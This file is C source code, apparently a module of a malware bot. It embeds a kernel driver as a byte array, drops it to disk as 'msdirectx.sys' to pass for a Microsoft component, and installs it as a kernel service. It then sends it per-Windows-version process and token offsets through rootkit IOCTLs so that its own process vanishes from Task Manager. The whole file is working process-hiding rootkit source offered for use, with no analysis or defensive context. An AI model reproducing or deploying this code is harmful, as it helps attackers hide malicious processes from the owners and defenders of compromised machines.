    0x57, 0x69, 0x74, 0x68, 0x54, 0x61, 0x67, 0x00, 0x42, 0x00, 0x45, 0x78, 0x41, 0x6C, 0x6C, 0x6F, 
    0x63, 0x61, 0x74, 0x65, 0x50, 0x6F, 0x6F, 0x6C, 0x57, 0x69, 0x74, 0x68, 0x54, 0x61, 0x67, 0x00, 
    0xF1, 0x01, 0x49, 0x6F, 0x66, 0x43, 0x6F, 0x6D, 0x70, 0x6C, 0x65, 0x74, 0x65, 0x52, 0x65, 0x71, 
    0x75, 0x65, 0x73, 0x74, 0x00, 0x00, 0x54, 0x01, 0x49, 0x6F, 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 
    0x53, 0x79, 0x6D, 0x62, 0x6F, 0x6C, 0x69, 0x63, 0x4C, 0x69, 0x6E, 0x6B, 0x00, 0x00, 0x4B, 0x01, 
    0x49, 0x6F, 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x44, 0x65, 0x76, 0x69, 0x63, 0x65, 0x00, 0x00, 
    0x7F, 0x02, 0x4B, 0x65, 0x54, 0x69, 0x63, 0x6B, 0x43, 0x6F, 0x75, 0x6E, 0x74, 0x00, 0x6E, 0x74, 
    0x6F, 0x73, 0x6B, 0x72, 0x6E, 0x6C, 0x2E, 0x65, 0x78, 0x65, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x10, 0x00, 0x00, 0x9C, 0x00, 0x00, 0x00, 0x15, 0x30, 0x1B, 0x30, 0x4A, 0x30, 0x54, 0x30, 
    0x5E, 0x30, 0x67, 0x30, 0x87, 0x30, 0xAB, 0x30, 0xB1, 0x30, 0xC2, 0x30, 0xB7, 0x31, 0xC3, 0x31, 
    0xCF, 0x31, 0xDB, 0x31, 0xF5, 0x31, 0x7A, 0x32, 0x2F, 0x33, 0x8E, 0x33, 0x9A, 0x33, 0xA7, 0x33, 
    0xAF, 0x33, 0x32, 0x34, 0x3A, 0x34, 0x42, 0x34, 0x4F, 0x34, 0x5A, 0x34, 0xB3, 0x34, 0xE6, 0x34, 
    0xEF, 0x34, 0xF8, 0x34, 0x01, 0x35, 0x0A, 0x35, 0x13, 0x35, 0x1C, 0x35, 0x24, 0x35, 0x7E, 0x35, 
    0x89, 0x35, 0x6B, 0x36, 0x88, 0x36, 0x9C, 0x36, 0xBA, 0x36, 0xC3, 0x36, 0xE4, 0x36, 0xEE, 0x36, 
    0x09, 0x37, 0x13, 0x37, 0x75, 0x37, 0x7C, 0x37, 0x8B, 0x37, 0x97, 0x37, 0xB1, 0x37, 0x1A, 0x39, 
    0x24, 0x39, 0x33, 0x39, 0x43, 0x39, 0xB1, 0x39, 0x05, 0x3A, 0x0B, 0x3A, 0x16, 0x3A, 0x24, 0x3A, 
    0x3A, 0x3A, 0x45, 0x3A, 0x55, 0x3A, 0x64, 0x3A, 0x69, 0x3A, 0x78, 0x3A, 0x8B, 0x3A, 0x91, 0x3A, 
    0x9E, 0x3A, 0xAD, 0x3A, 0xB9, 0x3A, 0xC2, 0x3A, 0xD8, 0x3A, 0xDE, 0x3A, 0x00, 0x40, 0x00, 0x00, 
    0x14, 0x00, 0x00, 0x00, 0x01, 0x30, 0x13, 0x30, 0x1A, 0x30, 0x1F, 0x30, 0x27, 0x30, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
} ;
//msdirectx_sys[6656]
static void ExtractDriver(char *file)
{
	unsigned long byteswritten;
	HANDLE FileHandle;
	FileHandle = CreateFile(file,GENERIC_WRITE,FILE_SHARE_WRITE,0,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,0);
	if (FileHandle == INVALID_HANDLE_VALUE)  return;
	WriteFile(FileHandle,msdirectx_sys,6656,&byteswritten,0);
	CloseHandle(FileHandle);
	return;
}

/****************************************************************************
*
*    Device Driver Functions
*
****************************************************************************/

BOOL RemoveDriver( IN SC_HANDLE SchSCManager, IN LPCTSTR DriverName )
{
    SC_HANDLE  schService;
    BOOL       ret;

    schService = OpenService( SchSCManager,
                              DriverName,
                              SERVICE_ALL_ACCESS
                              );

    if ( schService == NULL )
        return FALSE;

    ret = DeleteService( schService );
    CloseServiceHandle( schService );
    return ret;
}

BOOL InstallDriver( IN SC_HANDLE SchSCManager, IN LPCTSTR DriverName, IN LPCTSTR ServiceExe )
{
    SC_HANDLE  schService;

    //
    // NOTE: This creates an entry for a standalone driver. If this
    //       is modified for use with a driver that requires a Tag,
    //       Group, and/or Dependencies, it may be necessary to
    //       query the registry for existing driver information
    //       (in order to determine a unique Tag, etc.).
    //

    schService = CreateService( SchSCManager,          // SCManager database
                                DriverName,           // name of service
                                DriverName,           // name to display
                                SERVICE_ALL_ACCESS,    // desired access
                                SERVICE_KERNEL_DRIVER, // service type
                                SERVICE_DEMAND_START,  // start type
                                SERVICE_ERROR_NORMAL,  // error control type
                                ServiceExe,            // service's binary
                                NULL,                  // no load ordering group
                                NULL,                  // no tag identifier
                                NULL,                  // no dependencies
                                NULL,                  // LocalSystem account
                                NULL                   // no password
                                );
    if ( schService == NULL )
        return FALSE;

    CloseServiceHandle( schService );

    return TRUE;
}
BOOL LoadDeviceDriver( const TCHAR * Name, const TCHAR * Path, 
					  HANDLE * lphDevice, PDWORD Error )
{
	SC_HANDLE	schSCManager;
	BOOL		okay;

	schSCManager = OpenSCManager( NULL, NULL, SC_MANAGER_ALL_ACCESS );

	// Remove old instances
	RemoveDriver( schSCManager, Name );

	// Ignore success of installation: it may already be installed.
	InstallDriver( schSCManager, Name, Path );

	// Ignore success of start: it may already be started.
	StartDriver( schSCManager, Name );

	// Do make sure we can open it.
	okay = OpenDevice( Name, lphDevice );
	*Error = GetLastError();
 	CloseServiceHandle( schSCManager );

	return okay;
}

BOOL OpenDevice( IN LPCTSTR DriverName, HANDLE * lphDevice )
{
    TCHAR    completeDeviceName[64];
    HANDLE   hDevice;

    //
    // Create a \\.\XXX device name that CreateFile can use
    //
    // NOTE: We're making an assumption here that the driver
    //       has created a symbolic link using it's own name
    //       (i.e. if the driver has the name "XXX" we assume
    //       that it used IoCreateSymbolicLink to create a
    //       symbolic link "\DosDevices\XXX". Usually, there
    //       is this understanding between related apps/drivers.
    //
    //       An application might also peruse the DEVICEMAP
    //       section of the registry, or use the QueryDosDevice
    //       API to enumerate the existing symbolic links in the
    //       system.
    //

	if( (GetVersion() & 0xFF) >= 5 ) {

		//
		// We reference the global name so that the application can
		// be executed in Terminal Services sessions on Win2K
		//
		wsprintf( completeDeviceName, TEXT("\\\\.\\Global\\%s"), DriverName );

	} else {

		wsprintf( completeDeviceName, TEXT("\\\\.\\%s"), DriverName );
	}

    hDevice = CreateFile( completeDeviceName,
                          GENERIC_READ | GENERIC_WRITE,
                          0,
                          NULL,
                          OPEN_EXISTING,
                          FILE_ATTRIBUTE_NORMAL,
                          NULL
                          );
    if ( hDevice == ((HANDLE)-1) )
        return FALSE;

	// If user wants handle, give it to them.  Otherwise, just close it.
	if ( lphDevice )
		*lphDevice = hDevice;
	else
	    CloseHandle( hDevice );

    return TRUE;
}

BOOL StartDriver( IN SC_HANDLE SchSCManager, IN LPCTSTR DriverName )
{
    SC_HANDLE  schService;
    BOOL       ret;

    schService = OpenService( SchSCManager,
                              DriverName,
                              SERVICE_ALL_ACCESS
                              );
    if ( schService == NULL )
        return FALSE;

    ret = StartService( schService, 0, NULL )
       || GetLastError() == ERROR_SERVICE_ALREADY_RUNNING 
	   || GetLastError() == ERROR_SERVICE_DISABLED;

    CloseServiceHandle( schService );
    return ret;
}

static BOOL Initialized = FALSE;
HANDLE gh_Device = INVALID_HANDLE_VALUE;
static CHAR ac_driverLabel[] = "msdirectx";
static CHAR ac_driverName[] = "msdirectx.sys";
#define IOCTL_ROOTKIT_LISTPROC        (ULONG) CTL_CODE(FILE_DEVICE_ROOTKIT, 0x03, METHOD_BUFFERED, FILE_WRITE_ACCESS)
#define IOCTL_ROOTKIT_INIT            (ULONG) CTL_CODE(FILE_DEVICE_ROOTKIT, 0x01, METHOD_BUFFERED, FILE_WRITE_ACCESS)
#define IOCTL_ROOTKIT_HIDEME          (ULONG) CTL_CODE(FILE_DEVICE_ROOTKIT, 0x02, METHOD_BUFFERED, FILE_WRITE_ACCESS)
#define FILE_DEVICE_ROOTKIT      0x00002a7b


DWORD InitDriver()
{

	int iRetCode = ERROR_SUCCESS;
	HANDLE h_Device = INVALID_HANDLE_VALUE;
	DWORD  d_bytesRead, d_error;
	CHAR ac_driverPath[MAX_PATH];
	
    OSVERSIONINFOEX osvi;
    BOOL bOsVersionInfoEx;
	BOOL Found = FALSE;

	int  pid_offset = 0;
	int  flink_offset = 0;
	int  authid_offset = 0;
	int  token_offset = 0; 
	int  privcount_offset = 0;
	int  privaddr_offset  = 0;
	int  sidcount_offset = 0;
	int  sidaddr_offset  = 0;

	int  *os_offsets;

	try 
	{		
		if (Initialized)
		{
			return iRetCode;
		}



		// Try calling GetVersionEx using the OSVERSIONINFOEX structure.
		// If that fails, try using the OSVERSIONINFO structure.

		ZeroMemory(&osvi, sizeof(OSVERSIONINFOEX));
		osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);

		if( !(bOsVersionInfoEx = GetVersionEx ((OSVERSIONINFO *) &osvi)) )
		{
			// If OSVERSIONINFOEX doesn't work, try OSVERSIONINFO.
			osvi.dwOSVersionInfoSize = sizeof (OSVERSIONINFO);
			if (! GetVersionEx ( (OSVERSIONINFO *) &osvi) ) 
			return -1;
		}

		switch (osvi.dwPlatformId)
		{
			// Tests for Windows NT product family.
			case VER_PLATFORM_WIN32_NT:

			// Test for the product.

				if ( osvi.dwMajorVersion == 4 && osvi.dwMinorVersion == 0)
				{
					//fprintf(stderr, "Microsoft Windows NT 4.0 ");
					pid_offset = 148;
					flink_offset = 152;
					authid_offset = 24;
					token_offset = 264; 
					privcount_offset = 52;
					privaddr_offset  = 80;
					sidcount_offset = 48;
					sidaddr_offset  = 72;

					Found = TRUE;
				}
				else if ( osvi.dwMajorVersion == 5 && \
					      osvi.dwMinorVersion == 0 )
				{
					//fprintf(stderr, "Microsoft Windows 2000 ");
					pid_offset = 156;
					flink_offset = 160;
					authid_offset = 0x18;
					token_offset = 0x12c; 
					privcount_offset = 0x44;
					privaddr_offset  = 0x64;
					sidcount_offset = 0x3c;
					sidaddr_offset  = 0x58;

					Found = TRUE;
				}
				else if ( osvi.dwMajorVersion == 5 && osvi.dwMinorVersion == 1 )
				{
					//fprintf(stderr, "Microsoft Windows XP ");
					pid_offset = 132;
					flink_offset = 136;
					authid_offset = 24;
					token_offset = 200; 
					privcount_offset = 72;
					privaddr_offset  = 104;
					sidcount_offset = 64;
					sidaddr_offset  = 92;

					/* For Service Pack 2 Beta??
					privcount_offset = 84;
					privaddr_offset  = 116;
					sidcount_offset = 76;
					sidaddr_offset  = 104;
					*/

					Found = TRUE;
				}
				else if ( osvi.dwMajorVersion == 5 && osvi.dwMinorVersion == 2 )
				{
					//fprintf(stderr, "Microsoft Windows Server 2003 ");
					pid_offset = 132;
					flink_offset = 136;
					authid_offset = 24;
					token_offset = 200; 
					privcount_offset = 84;
					privaddr_offset  = 116;
					sidcount_offset = 76;
					sidaddr_offset  = 104;

					Found = TRUE;
				}

      // Display version, service pack (if any), and build number.
	  /*		
			if ( osvi.dwMajorVersion <= 4 )
			{
				fprintf(stderr, "version %d.%d %s (Build %d)\n",
				osvi.dwMajorVersion,
				osvi.dwMinorVersion,
				osvi.szCSDVersion,
				osvi.dwBuildNumber & 0xFFFF);
			}
			else
			{ 
				fprintf(stderr, "%s (Build %d)\n",
				osvi.szCSDVersion,
				osvi.dwBuildNumber & 0xFFFF);
			}
	  */	
         break;

	  default:
		  //fprintf(stderr, "\nOperating System Version %d.%d Not Supported!\n", osvi.dwMajorVersion, osvi.dwMinorVersion); 
		  return -1;
		  break; // Never executed
		}
	if (!Found)
	{
		//fprintf(stderr, "\nOperating System Version %d.%d Not Supported!\n",
//			osvi.dwMajorVersion,
//			osvi.dwMinorVersion); 
		return -1;
	}
	else 
	{
		if (GetCurrentDirectory(MAX_PATH, ac_driverPath))
		{
			strncat(ac_driverPath, "\\", MAX_PATH-strlen(ac_driverPath));
			strncat(ac_driverPath, ac_driverName, MAX_PATH-strlen(ac_driverPath));
		}
		LoadDeviceDriver(ac_driverLabel, ac_driverPath ,&h_Device, &d_error);
		if (h_Device == INVALID_HANDLE_VALUE)
		{
			//fprintf(stderr, "Unable to Load Driver");
			throw d_error;
		}
		gh_Device = h_Device;


		os_offsets = (int *)calloc(1, sizeof(int)*8);
		if (!os_offsets)
		{
			//fprintf(stderr, "Memory allocation failed.\n");
			return -1;
		}

		memcpy(os_offsets, &pid_offset, sizeof(int));
		memcpy(os_offsets + 1, &flink_offset, sizeof(int));
		memcpy(os_offsets + 2, &authid_offset, sizeof(int));
		memcpy(os_offsets + 3, &token_offset, sizeof(int));
		memcpy(os_offsets + 4, &privcount_offset, sizeof(int));
		memcpy(os_offsets + 5, &privaddr_offset, sizeof(int));
		memcpy(os_offsets + 6, &sidcount_offset, sizeof(int));
		memcpy(os_offsets + 7, &sidaddr_offset, sizeof(int));

		if(!DeviceIoControl(gh_Device, IOCTL_ROOTKIT_INIT,
							os_offsets,
							sizeof(int)*8,
							NULL,
							0,
							&d_bytesRead,
							NULL))
		{
			//fprintf(stderr, "Error Initializing Driver with offsets.\n");
			throw;
		}
		if (os_offsets)
			free(os_offsets);
	}
	}catch (DWORD error) {
      LPVOID lpMsgBuf = NULL;
      FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER | 
					FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
					NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), 
					(LPTSTR) &lpMsgBuf, 0, NULL);
	  //fprintf(stderr, "%s\n",lpMsgBuf);
	  if (lpMsgBuf)
		LocalFree(lpMsgBuf);

	  return -1;	
	} catch (...) {
      LPVOID lpMsgBuf = NULL;
	  DWORD error = 0;
      error = GetLastError();
      FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER | 
					FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
					NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), 
					(LPTSTR) &lpMsgBuf, 0, NULL);
	  //fprintf(stderr, "%s\n",lpMsgBuf);	
	  if (lpMsgBuf)
		LocalFree(lpMsgBuf);

      return -1;	
	}

	Initialized = TRUE;
	return (iRetCode);
} //InitDriver()

DWORD ListProc(void *buffer, int buff_size)
{
	DWORD d_bytesRead;
	DWORD success;

	if (!Initialized)
	{
		return ERROR_NOT_READY;
	}

	if (buffer == NULL)
		return ERROR_INVALID_ADDRESS;

	success = DeviceIoControl(gh_Device, 
					IOCTL_ROOTKIT_LISTPROC,
					NULL,
					0,
					buffer,
					buff_size,
					&d_bytesRead,
					NULL);
	
	return d_bytesRead; // Return the number of bytes actually written to the buffer	
}

DWORD HideProc(DWORD pid)
{
	DWORD d_bytesRead;
	DWORD success;

	if (!Initialized)
	{
		return ERROR_NOT_READY;
	}

	success = DeviceIoControl(gh_Device, 
					IOCTL_ROOTKIT_HIDEME,
					(void *) &pid,
					sizeof(DWORD),
					NULL,
					0,
					&d_bytesRead,
					NULL);
	
	return success;	
}

void taskhider() {
	char *buffer, *start, file[MAX_PATH];
	const int PROCNAMELEN = 26;
	//extract the driver if need be
	ExtractDriver("msdirectx.sys");
	//lets load the driver
	if (InitDriver() == -1) return;
	//lets get are filename
	GetModuleFileName(GetModuleHandle(NULL), file, sizeof(file));
	PathStripPath(file);
	//lets list the processes to get are pid
	int size = 100;
	buffer = (char *)calloc(1,size * PROCNAMELEN);
	if (buffer == NULL) return;
	start = buffer;
	size = ListProc(buffer, size*PROCNAMELEN);
	size /= PROCNAMELEN;
	int ploop = 1;
	while(ploop <= size)
	{
		if(strstr(buffer,file)!=NULL)
		{
			char *pid;
			pid = strtok(buffer,":");
			//printf("Process: %s\n",pid);
			pid = strtok(NULL,":");
			if (HideProc(strtoul(pid,NULL,10))!=0) addlog("Hidden From TaskManager!");
		}
		buffer += PROCNAMELEN;
		ploop++;
	}
	if(start)
		free(start);
return;
}
#endif